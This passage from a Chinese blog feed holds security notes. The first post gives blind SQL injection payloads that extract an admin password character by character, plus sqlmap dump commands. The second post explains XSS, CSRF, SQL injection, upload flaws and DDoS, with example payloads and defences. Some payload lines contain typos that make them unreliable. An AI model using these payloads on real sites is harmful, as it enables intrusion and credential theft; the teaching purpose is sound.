class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## 网站记录</span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span> <span class=\"operator\">=</span> <span class=\"operator\">&lt;</span>??<span class=\"operator\">&gt;</span></span><br><span class=\"line\">记录非法语句，盲连log</span><br><span class=\"line\">或者使用cookie注入（工具）</span><br></pre></td></tr></table></figure>\n<h2 id=\"参数注入\"><a class=\"markdownIt-Anchor\" href=\"#参数注入\"></a> 参数注入</h2>\n<h3 id=\"数字型\"><a class=\"markdownIt-Anchor\" href=\"#数字型\"></a> 数字型</h3>\n<p>?id=1 'and 1=1 #</p>\n<h3 id=\"字符型\"><a class=\"markdownIt-Anchor\" href=\"#字符型\"></a> 字符型</h3>\n<p>?name=客户 'and 1=1 #</p>\n<h3 id=\"搜索型\"><a class=\"markdownIt-Anchor\" href=\"#搜索型\"></a> 搜索型</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">like</span>像通配符<span class=\"operator\">*</span><span class=\"keyword\">sql</span>通配符<span class=\"operator\">%</span><span class=\"operator\">%</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> news <span class=\"keyword\">where</span> id<span class=\"operator\">=</span>&quot;&quot;<span class=\"operator\">%</span><span class=\"keyword\">like</span> $id<span class=\"operator\">%</span><span class=\"operator\">-</span></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>search.asp?Field<span class=\"operator\">=</span>Title<span class=\"operator\">&amp;</span>BigClassName<span class=\"operator\">=</span><span class=\"operator\">&amp;</span>SmallClassName<span class=\"operator\">=</span><span class=\"operator\">&amp;</span>keyword<span class=\"operator\">=</span><span class=\"number\">123</span><span class=\"operator\">&amp;</span>Submit<span class=\"operator\">=</span><span class=\"operator\">%</span>CB<span class=\"operator\">%</span>D1<span class=\"operator\">%</span>CB<span class=\"operator\">%</span>F7</span><br><span class=\"line\">参数:keyword<span class=\"operator\">=</span><span class=\"number\">123</span></span><br><span class=\"line\">&quot;%%&#x27;and 1=2 and &#x27;%&#x27;=&#x27;%&#x27;</span><br><span class=\"line\">2%&#x27;and 1=1 and &quot;<span class=\"operator\">%</span><span class=\"string\">&#x27;=&#x27;</span>返回和单独输入<span class=\"number\">2</span>是一样的页面</span><br><span class=\"line\"><span class=\"number\">2</span><span class=\"operator\">%</span><span class=\"string\">&#x27;and 1=2 and &#x27;</span><span class=\"operator\">%</span><span class=\"string\">&#x27;=&#x27;</span>返回不同</span><br><span class=\"line\"><span class=\"number\">2</span><span class=\"operator\">%</span><span class=\"string\">&#x27;and(select count(*)from mssysaccessobjects)&gt;0 and &#x27;</span><span class=\"operator\">%</span><span class=\"string\">&#x27;=&#x27;</span><span class=\"operator\">/</span><span class=\"operator\">/</span>返回正常。</span><br><span class=\"line\">access数据库<span class=\"number\">2</span><span class=\"operator\">%</span><span class=\"string\">&#x27;and(select count(*)from admin_user)&gt;0 and %&#x27;</span><span class=\"operator\">=</span><span class=\"string\">&#x27;//返回正常非常幸运，存在admin_user表</span></span><br><span class=\"line\"><span class=\"string\">2%and(selec count(usemame)from admin_user)&gt;0 and %&#x27;</span><span class=\"operator\">=</span><span class=\"string\">&#x27;//返回正常存在usemame字段</span></span><br><span class=\"line\"><span class=\"string\">2% and(select count(password)Irorm admin_user)&gt;0 and &quot;% =&#x27;</span><span class=\"operator\">/</span><span class=\"operator\">/</span>返回正常,并且存在passward字段</span><br><span class=\"line\"><span class=\"number\">2</span><span class=\"operator\">%</span> <span class=\"keyword\">and</span>(<span class=\"keyword\">select</span> top <span class=\"number\">1</span> len(admin)<span class=\"keyword\">from</span> admin_user)<span class=\"operator\">&gt;</span><span class=\"number\">4</span> <span class=\"keyword\">and</span> &quot;%&#x27;=&#x27;//返回正常username长度大于4</span><br><span class=\"line\">2% and(select top 1 len(username)from admin_user)=5 and &#x27;%&#x27;=&#x27;//返回正常username长度等于5</span><br><span class=\"line\">2%&#x27;and(select count(&quot;<span class=\"operator\">*</span>)<span class=\"keyword\">from</span> mssysaccessobjects)<span class=\"operator\">&gt;</span><span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"operator\">%</span><span class=\"string\">&#x27;=&#x27;</span><span class=\"operator\">/</span><span class=\"operator\">/</span>返回正常。access数据库</span><br><span class=\"line\"><span class=\"number\">2</span><span class=\"operator\">%</span><span class=\"string\">&#x27;and(select count(*)from admin_user)&gt;0 and &#x27;</span><span class=\"operator\">%</span><span class=\"string\">&#x27;=&#x27;</span><span class=\"operator\">/</span><span class=\"operator\">/</span>返回正常非常幸运，存在admin_user表</span><br><span class=\"line\"><span class=\"number\">2</span><span class=\"operator\">%</span><span class=\"string\">&#x27;and(select count(usermame)from admin_user)&gt;0 and &#x27;</span><span class=\"operator\">%</span><span class=\"operator\">=</span><span class=\"string\">&#x27;//返回正常存在usemame字段</span></span><br><span class=\"line\"><span class=\"string\">2% and(select count(password)from admin _user)&gt;0 and %&#x27;</span><span class=\"operator\">=</span><span class=\"string\">&#x27;/f返回正常,并且存在password字段</span></span><br><span class=\"line\"><span class=\"string\">2% and(select top 1 len(admin)from admin_user)&gt;4 and &#x27;</span><span class=\"operator\">%</span><span class=\"string\">&#x27;=&#x27;</span><span class=\"operator\">/</span><span class=\"operator\">/</span>返回正常usemame长度大于<span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"number\">2</span><span class=\"operator\">%</span> <span class=\"keyword\">and</span>(<span class=\"keyword\">select</span> top <span class=\"number\">1</span> len(username)<span class=\"keyword\">from</span> admin_user)<span class=\"operator\">=</span><span class=\"number\">5</span> <span class=\"keyword\">and</span> &quot;%=&#x27;//返回正常username长度等于5</span><br><span class=\"line\">2%&#x27;and(select top 1 len(password)from admin_user)=16 and %&#x27;=&#x27;//返回错误，看来密码不是16位md5加密的，或者没加密，32位加密，或更高。</span><br><span class=\"line\">2010%&#x27;and(select top 1 len(password)from admin_user)=32 and %&#x27;=&#x27;//返回正常,看来应该是32位加密。</span><br><span class=\"line\">以下都是对应位置的ascii的编码，如果不是则返回错误。</span><br><span class=\"line\">2%&#x27;and(select top 1 asc(mid(password,1,1))from admin_user)=55 and &#x27;%&#x27;=&#x27;</span><br><span class=\"line\">如果是:2010%&#x27;and(select top 1 asc(mid(password,1,1))from admin_user)=48 and &#x27;% &#x27;=&#x27;，</span><br><span class=\"line\">//则返回错误，因为password字段第一个字母asci编码不是48，而是55.所以返回结果不同。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">### 工具</span><br><span class=\"line\">burpsuite</span><br><span class=\"line\">sqlmap</span><br><span class=\"line\">先使用burp抓包，保存到1.txt文件里</span><br><span class=\"line\">sqlmap -r 1.txt --tables 猜表名</span><br><span class=\"line\">sqlmap -r 1.txt --columns -T &quot;admin&quot; 猜列名</span><br><span class=\"line\">sqImap -r 1.txt --C &quot;admin.password&quot;-T &quot;manager&quot;--dump -v 2 列内容</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"伪静态页面注入\"><a class=\"markdownIt-Anchor\" href=\"#伪静态页面注入\"></a> 伪静态页面注入</h2>\n<p>形如：</p>\n<ul>\n<li>/index.php/xxx/id/1234.html</li>\n<li>/index.jsp/xxx/id/1234</li>\n<li>/showarticle_55.html</li>\n</ul>\n<p>尝试拆解原请求页面成php?id=1234，在进行常规操作</p>\n",
            "tags": [
                "安全"
            ]
        },
        {
            "id": "http://example.com/2021/05/21/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/",
            "url": "http://example.com/2021/05/21/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/",
            "title": "Web攻击方式",
            "date_published": "2021-05-21T10:39:27.000Z",
            "content_html": "<h2 id=\"web攻击\"><a class=\"markdownIt-Anchor\" href=\"#web攻击\"></a> Web攻击</h2>\n<p>在互联网中，攻击手段数不胜数，我们平时不能以自己只是普通的开发程序员而不是安全方向的开发者为理由，而不去掌握基本的 <strong>Web</strong> 攻击手段！我们来熟悉一下有哪几种常见的 <strong>Web</strong> 攻击手段</p>\n<p><img src=\"image-20210814144835736.png\" class=\"lazyload placeholder\" data-srcset=\"image-20210814144835736.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\" /></p>\n<p>常见的 <strong>Web</strong> 攻击手段主要有 <code>XSS 攻击</code>、<code>CSRF 攻击</code>、<code>SQL 注入攻击</code>、<code>DDos 攻击</code>、<code>文件漏洞攻击</code>等。这几种攻击方式的防护手段并不复杂，却还是有很多企业遭受了该攻击，朔源到头，还是因为人为的疏忽。</p>\n<h3 id=\"一-xss-攻击\"><a class=\"markdownIt-Anchor\" href=\"#一-xss-攻击\"></a> 一、XSS 攻击</h3>\n<p><strong>XSS</strong> 攻击的全称为 <code>跨站脚本攻击（Cross Site Scripting）</code></p>\n<blockquote>\n<p>为什么不叫<code>CSS</code> ，那是因为为了不跟层叠样式表（Cascading Style Sheet，CSS）混淆</p>\n</blockquote>\n<p><strong>XSS攻击</strong> 是 <strong>Web</strong> 应用中最常见到的攻击手段之一。</p>\n<p><strong>跨站脚本攻击</strong>，关键词 <code>脚本</code>。</p>\n<p>攻击者常常在网页中嵌入了恶意的脚本程序，当用户打开该网页的时候，脚本程序便开始在客户端的浏览器后台执行，常用于盗取客户端的 <strong>cookie</strong>，用户名密码，下载执行病毒的木马程序，以及获取客户端 <strong>Admin</strong> 权限。</p>\n<h4 id=\"1-攻击原理\"><a class=\"markdownIt-Anchor\" href=\"#1-攻击原理\"></a> 1、攻击原理</h4>\n<p>前端常用表单的形式向后台提交信息</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;cbuc&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p>很普通的一段<strong>html</strong>代码，向后台提交 <strong>username</strong> 的信息，正常情况下，用户一般会输入自己的 <strong>username</strong>，这个时候毫无问题，但是在不正常的情况下，用户输入的不是一个正常的字符串，而是 <code>&quot;/&gt;&lt;script&gt; alert(&quot;bingo&quot;) &lt;/script&gt;&lt;!-</code> 。按这个时候表单的内容就会变成</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;&quot;</span>/&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"> alert(<span class=\"string\">&quot;bingo&quot;</span>) </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>&lt;!-&quot; /&gt;</span><br></pre></td></tr></table></figure>\n<p>这个时候向后台提交参数，由于 username 的不合法性，校验可能不通过，服务端就重定向会该页面，并且带上以上参数，这个时候页面就会弹出一个警告框：</p>\n<p><img src=\"image-20210814150800839.png\" class=\"lazyload placeholder\" data-srcset=\"image-20210814150800839.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\" /></p>\n<p>警告框问题不是很大，是因为取决于这段脚本，如果攻击者稍做修改，那么性质可能就不一样了~</p>\n<p>甚至，攻击者可以对URL进行操作，正常提交的地址为</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">www.xxx.com/login?username=<span class=\"string\">&quot;/&gt;&lt;script&gt; alert(&quot;</span>bingo<span class=\"string\">&quot;) &lt;/script&gt;&lt;!-&quot;</span></span><br></pre></td></tr></table></figure>\n<p>攻击者可以对 URL 进行编码用来迷惑用户：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">www.xxx.com/login?username=<span class=\"string\">&quot;%2F%3E%3Cscript%3E%20alert(%22bingo%22)%20%3C%2Fscript%3E%3C!-&quot;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"2-防护手段\"><a class=\"markdownIt-Anchor\" href=\"#2-防护手段\"></a> 2、防护手段</h4>\n<p>知道了如何攻击，防护起来就不难，我们对症下药即可。既然输入的参数不合法，我们就很有必要对入参进行校验，比如 <code>&lt;、&gt;、&quot;、&quot;、'、'</code> 这些特殊字符我们很有必要进行转义与校验。</p>\n<h3 id=\"二-csrf-攻击\"><a class=\"markdownIt-Anchor\" href=\"#二-csrf-攻击\"></a> 二、CSRF 攻击</h3>\n<p><strong>CSRF</strong> 攻击全称 <code>跨站请求伪造 (Cross site request forgery)</code>。是一种对网站的恶意利用，我们上面说到的 <strong>XSS攻击</strong> 是利用站点内的信任用户，自己去触发脚本而导致的攻击。而 <strong>CSRF</strong> 则是通过伪装来自受信任用户的请求去利用受攻击的网站。</p>\n<p><strong>CSRF 攻击</strong>，关键词：<code>伪造</code>。</p>\n<p>攻击这盗用了访问用户的身份，以访问者的名义向第三方网站发送恶意请求，常用于利用访问者的身份发送消息，进行交易转账以及盗取账号。</p>\n<h4 id=\"1-攻击原理-2\"><a class=\"markdownIt-Anchor\" href=\"#1-攻击原理-2\"></a> 1、攻击原理</h4>\n<p><img src=\"image-20210814155503658.png\" class=\"lazyload placeholder\" data-srcset=\"image-20210814155503658.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210814155503658\" /></p>\n<p><strong>受害者</strong>首先在<strong>信任站点</strong>完成了登录，并且生成了 Cookie，Cookie会在浏览器保存一定的时间。到这一步，用户如果在没有登出 <strong>信任站点</strong> 的情况下，访问了 <strong>恶意站点</strong>，这个时候 <strong>恶意站点</strong> 就会向 <strong>信任站点</strong> 发起请求，这个请求就会带上以上生成的 Cookie，当恶意请求来到 <strong>信任站点</strong>，<strong>信任站点</strong> 看到请求携带的 Cookie，就会判断该请求是 <strong>受害者</strong> 发出的。因此 <strong>信任站点</strong> 就会根据 <strong>受害者</strong> 的权限来完成 <strong>恶意请求</strong> 的指令，而这个指令可能是利用 <strong>受害者</strong> 的身份发送消息，转账支付等等操作，这样 <strong>恶意站点</strong> 就达到了伪造 <strong>受害者</strong> 请求 <strong>信任站点</strong> 的目的。</p>\n<p>看到这个流程不知道你是否有所启发，不知道屏幕前的小伙伴是否有过 <code>QQ</code> 被盗用的经历，当然，有些盗用的手段与上面的流程是相似的。</p>\n<p>该攻击手段在日常中十分常见。如果某个支付系统的转账地址为 <code>www.xxx.com/pay?accountNum=xxxx&amp;money=xxx</code>。其中 <strong>accountNum</strong> 为转账目的的账户，<strong>money</strong> 为转账金额。那这个时候如果你刚巧登录过了该支付系统，又没有及时的登出，在访问<code>恶意站点</code>的时候，如果你点开了某张图片，而图片的地址为 ：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;www.xxx.com/pay?accountNum=xxxx&amp;money=xxx&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p>当你美滋滋地浏览图片的时候，却不知道此时你的账户上已经悄悄的少了指定金额！</p>\n<p>这就是因为你没有及时的登出<code>支付系统</code>，而又点击了 <code>恶意站点</code>的 <strong>恶意链接</strong>，携带了你未过期的 Cookie，成功窃取了你的金额。</p>\n<h4 id=\"2-防护手段-2\"><a class=\"markdownIt-Anchor\" href=\"#2-防护手段-2\"></a> 2、防护手段</h4>\n<p>同样知其症下其药！防护手段如下：</p>\n<h5 id=\"1将-cookie-设置为-httponly\"><a class=\"markdownIt-Anchor\" href=\"#1将-cookie-设置为-httponly\"></a> 1）将 cookie 设置为 HttpOnly</h5>\n<p><strong>CSRF</strong> 攻击的关键就在于利用了用户未过期的 <strong>Cookie</strong>，那么为了防止 <strong>Cookie</strong> 的盗取，就需要在 <strong>Cookie</strong> 中设置 <strong>HttpOnly</strong> 属性，这样通过程序（<code>XSS 攻击</code>）就无法读取到 <strong>Cookie</strong> 信息，避免了攻击者伪造 <strong>Cookie</strong> 的情况出现。</p>\n<h5 id=\"2增加-token\"><a class=\"markdownIt-Anchor\" href=\"#2增加-token\"></a> 2）增加 token</h5>\n<p>该防护手段还是针对 <strong>Cookie</strong> 的盗取，由于请求中所有的用户验证信息都存放于 <strong>Cookie</strong> 中，因为我们抵御 <strong>CSRF</strong> 的关键就在于：<strong>如何在请求中放入攻击者所不能伪造的信息</strong>，并且该信息不能存放在 <strong>Cookie</strong> 中。那么我们就可以在请求返回中加入一个随机生成的 <code>token</code>，当请求来到时进行 <strong>token</strong> 的校验，如果校验不通过则认为是 <strong>CSRF</strong> 攻击而拒绝该请求。</p>\n<h5 id=\"3通过-referer\"><a class=\"markdownIt-Anchor\" href=\"#3通过-referer\"></a> 3）通过 Referer</h5>\n<p>根据 <strong>HTTP</strong> 协议，在 <strong>HTTP</strong> 请求头上有一个字段叫做 <code>referer</code>，它记录了该<strong>Http</strong> 请求的来源地址。在通常情况下，访问一个安全受限的页面的请求都来自同一个网站。</p>\n<p>在 <strong>CSRF</strong> 中恶意请求是从 <strong>恶意站点</strong> 发出的，因此要防御 <strong>CSRF</strong> 攻击，需要对每一个请求验证其 <strong>referer</strong> 值即可。</p>\n<p><img src=\"image-20210814161915170.png\" class=\"lazyload placeholder\" data-srcset=\"image-20210814161915170.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210814161915170\" /></p>\n<h3 id=\"三-sql-注入攻击\"><a class=\"markdownIt-Anchor\" href=\"#三-sql-注入攻击\"></a> 三、SQL 注入攻击</h3>\n<p><strong>SQL注入</strong> 是程序员最经常遇到的，所谓 <strong>SQL注入</strong>，就是通过把 <strong>SQL</strong> 命令伪装成正常的请求参数，传递到服务端，欺骗服务器最终执行恶意的 <strong>SQL命令</strong>，达到入侵的目的。攻击者常常利用 <strong>SQL</strong> 注入的漏洞，来查询非授权的关键信息，修改数据库服务器的数据，改变表结构，危害极大！</p>\n<h4 id=\"1-攻击原理-3\"><a class=\"markdownIt-Anchor\" href=\"#1-攻击原理-3\"></a> 1、攻击原理</h4>\n<p>我们查询用户存不存在往往是通过以下 SQL：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> s_user <span class=\"keyword\">WHERE</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;&#x27;</span> <span class=\"keyword\">and</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;&#x27;</span> </span><br></pre></td></tr></table></figure>\n<p>当我们后端使用以下代码查询时，便会出现致命的漏洞</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Connection  con = getConnection();</span><br><span class=\"line\">Statement st = (Statement) con.createStatement();</span><br><span class=\"line\">String sql = <span class=\"string\">&quot;SELECT * FROM s_user WHERE username = &#x27;&quot;</span>+ username +<span class=\"string\">&quot;&#x27; and password = &#x27;&quot;</span>+ passward+<span class=\"string\">&quot;&#x27; &quot;</span>;</span><br><span class=\"line\">ResultSet rs = st.executeQuery(sql);</span><br><span class=\"line\"><span class=\"keyword\">while</span>(rs.next())&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面代码逻辑便是利用前端传入的参数进行数据库查询，乍看之下感觉毫无问题，但是这个时候如果 <code>password</code> 前端传过来的值是 <code>' or '1'='1</code></p>\n<p>那这个时候 SQL 就会变成</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> s_user <span class=\"keyword\">WHERE</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;&#x27;</span> <span class=\"keyword\">and</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;&#x27;</span> <span class=\"keyword\">or</span> <span class=\"string\">&#x27;1&#x27;</span><span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span> </span><br></pre></td></tr></table></figure>\n<p>这样的 SQL 不用试都知道会把数据库中的用户全都查出来，明明没有输入正确的密码，却返回了登录成功。而这便是一次简单且典型的 SQL 注入攻击。</p>\n<p><code>' or '1'='1</code> 危害是让用户免密码登录，如果传过来的值为 <code>'; drop table xxx; --</code> 这个时候问题就大了！</p>\n<h4 id=\"2-防护手段-3\"><a class=\"markdownIt-Anchor\" href=\"#2-防护手段-3\"></a> 2、防护手段</h4>\n<h5 id=\"1使用预编译语句\"><a class=\"markdownIt-Anchor\" href=\"#1使用预编译语句\"></a> 1）使用预编译语句</h5>\n<p>预编译语句 <strong>PreparedStatement</strong> 是 java.sql 中的一个接口，继承自 <strong>Statement</strong> 接口。</p>\n<p>预编译语句和 <strong>Statement</strong> 的不同之处在于，创建 <strong>PreparedStatement</strong> 对象时就指定了 SQL 语句，该语句立即发送给 <strong>DBMS</strong> 进行编译，当该编译语句需要被执行时，<strong>DBMS</strong> 直接运行编译后的 SQL 语句，而不需要像其他 SQL 语句那样先将其编译：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String sql = <span class=\"string\">&quot;SELECT * FROM s_user WHERE username = ? and password = ? &quot;</span>;</span><br><span class=\"line\">PreparedStatement st = conn.preparedStatement(sql);</span><br><span class=\"line\">st.setString(<span class=\"number\">1</span>, username);</span><br><span class=\"line\">st.setString(<span class=\"number\">2</span>, password);</span><br><span class=\"line\">ResultSet rs = st.executeQUery();</span><br></pre></td></tr></table></figure>\n<p>可以看到，SQL 语句中原有的白能量已经用占位符 ？ 替代了，变量通过 <code>setString()</code> 方法进行设置。</p>\n<h5 id=\"2使用-orm-框架\"><a class=\"markdownIt-Anchor\" href=\"#2使用-orm-框架\"></a> 2）使用 ORM 框架</h5>\n<p>防止 <strong>SQL</strong> 注入的关键手段在于对一些关键字进行转义，而常见的一些 ORM 框架，如 Mybatis，Hibernate等，都支持对响应的关键字或者特殊符号进行转义，可以通过简单的配置，很好的预防 SQL 注入的漏洞，降低普通开发人员进行安全编程的门槛。</p>\n<h3 id=\"四-文件上传漏洞\"><a class=\"markdownIt-Anchor\" href=\"#四-文件上传漏洞\"></a> 四、文件上传漏洞</h3>\n<p>很多网站都有上传的功能，如上传图片、文件、压缩包等等。而这些资源往往是保存在远端服务器上。文件上传攻击指的就是攻击者利用一些站点没有对文件类型做很好的校验，上传了可执行的文件或脚本，并且通过脚本对服务器进行一定的权限操作，或是通过诱导外部用户访问该脚本文件，达到攻击的目的。</p>\n<p>当然，这种攻击防护上也是比较简单，为了防止用户上传恶意的可执行脚本文件，以及将文件上传服务器当做免费的文件存储服务器来使用，我们需要对上传文件的类型进行白名单校验，并且需要限制上传文件的大小，上传的文件需要进行重新命名，使攻击这无法猜测到上传文件的访问路径。</p>\n<p>其中对上传文件的类型进行白名单校验，并不能单单通过后缀名称来判断文件的类型，因为攻击者很有可能可以通过将可执行文件的后缀名称改为其他可上传的后缀名称进行上传，因为判断文件类型就需要使用更加安全的方式。</p>\n<p>很多类型的文件，其实的几个字节内容是固定的，因此根据这几个字节的内容，就可以确定文件类型，而这几个字节也被成为 <code>魔数</code></p>\n<p><img src=\"QQ%E5%9B%BE%E7%89%8720210814175648.png\" class=\"lazyload placeholder\" data-srcset=\"QQ%E5%9B%BE%E7%89%8720210814175648.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\" /></p>\n<p>以上便是文件类型的魔数，然后我们通过获取文件的文件头与文件类型的魔数相比较来判断文件类型</p>\n<p><img src=\"image-20210814181913108.png\" class=\"lazyload placeholder\" data-srcset=\"image-20210814181913108.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\" /></p>\n<h3 id=\"五-ddos攻击\"><a class=\"markdownIt-Anchor\" href=\"#五-ddos攻击\"></a> 五、DDOS攻击</h3>\n<p><strong>DDos攻击</strong> 又称为 <code>分布式拒绝服务攻击 (Distributed Denial of Service)</code>，是目前最为强大，最难以防御的攻击方式之一。</p>\n<p>在了解 <strong>DDoS</strong> 之前，我们需要先知道什么是 <strong>DoS</strong>。最基本的 <strong>DoS</strong> 就是利用合理的客户端请求里占用过多的服务器资源，从而使合法用户无法得到服务器的响应。<strong>DDoS</strong> 攻击便是在传统的 <strong>DoS</strong> 攻击的基础上产生的一类攻击方式。传统的 <strong>DoS</strong>攻击一般是一对一的方式，当攻击目标的CPU速度、内存或者网络带宽等各项性能指标不高的情况下，它的效果是明显的，但随着计算机与网络技术的发展，计算机的处理能力显著增加，内存不断增大，这便使得 <strong>DoS</strong> 攻击逐渐失去了效果。</p>\n<blockquote>\n<p>这就跟单体应用向分布式架构的演进一样，传统的 <strong>DoS</strong> 演进到了<strong>分布式DoS (DDoS)</strong> 。</p>\n</blockquote>\n<h4 id=\"1-攻击原理-4\"><a class=\"markdownIt-Anchor\" href=\"#1-攻击原理-4\"></a> 1、攻击原理</h4>\n<p><strong>DDoS</strong> 攻击指的便是攻击者借助公共网络，将数量庞大的计算机设备联合起来作为攻击平台，对一个或多个目标发动攻击，从而达到瘫痪目标主机的目的。通常在攻击开始之前，攻击者会提前控制大量的用户计算机，这类计算机称之为 <code>肉鸡</code>，并通过指令使大量的的肉鸡在同一时刻对某个主机进行访问，从而达到瘫痪目标主机的目的。</p>\n<h4 id=\"2-ddos分类\"><a class=\"markdownIt-Anchor\" href=\"#2-ddos分类\"></a> 2、DDoS分类</h4>\n<p><strong>DDoS</strong> 是一种攻击手段，其中又分为好几种 <strong>DDoS攻击</strong></p>\n<h5 id=\"1syn-flood\"><a class=\"markdownIt-Anchor\" href=\"#1syn-flood\"></a> 1）SYN Flood</h5>\n<p><strong>SYN Flood</strong> 是互联网中最经典的攻击方式之一，要了解该攻击方式，我们需要从 <strong>TCP</strong> 协议连接的过程说起。众所周知，<strong>TCP</strong> 协议在通信之前，必须先建立基于 TCP 协议的一个连接，以下是建立连接的过程：</p>\n<p><img src=\"image-20210814183326339.png\" class=\"lazyload placeholder\" data-srcset=\"image-20210814183326339.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\" /></p>\n<p>这是一张非常建议的 <strong>TCP 三次握手</strong>的过程。</p>\n<ol>\n<li>第一步，客户端发送一个包含 <strong>SYN</strong> 标识的 TCP 报文，SYN 即同步（Synchronized）的意思，<strong>SYN</strong>报文会指明客户端的端口号以及 TCP 连接的初始序列号</li>\n<li>第二步，服务器在收到客户端的 <strong>SYN</strong> 报文后，会返回一个 <strong>SYN+ACK</strong> 的报文，表示客户端请求被接收，同时 TCP 序列号被加 1，<strong>ACK</strong> 即确认（Acknowledgment）的意思</li>\n<li>第三步，客户端在接收到服务端的 <strong>SYN + ACK</strong> 报文后，也会返回一个 <strong>ACK</strong> 报给服务端，同样，TCP 的序列号加 